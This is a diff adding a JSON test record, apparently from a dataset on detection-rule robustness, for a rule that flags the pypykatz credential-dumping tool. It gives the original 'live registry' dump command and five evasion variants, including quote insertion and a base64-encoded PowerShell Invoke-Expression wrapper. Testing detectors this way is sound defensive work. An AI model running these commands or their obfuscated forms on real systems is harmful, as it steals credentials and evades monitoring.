@@ -1,0 +1,11 @@
+{
+  "rule_name": "proc_creation_win_hktl_pypykatz_0",
+  "original_command": "\\pypykatz.exe \\python.exe live registry",
+  "evasions": {
+    "insertion": "\\\"p\"\"y\"\"p\"\"y\"\"k\"\"a\"\"t\"\"z\"\".\"\"e\"\"x\"\"e\" \\python.exe live registry",
+    "substitution": "\\pypykatz.exe \\python.exe live registry #substitution",
+    "omission": "\\pypykatz \\python live registry",
+    "reordering": "\\pypykatz.exe live registry \\python.exe",
+    "recoding": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('XHB5cHlrYXR6LmV4ZSBccHl0aG9uLmV4ZSBsaXZlIHJlZ2lzdHJ5')) | Invoke-Expression\" "
+  }
+}
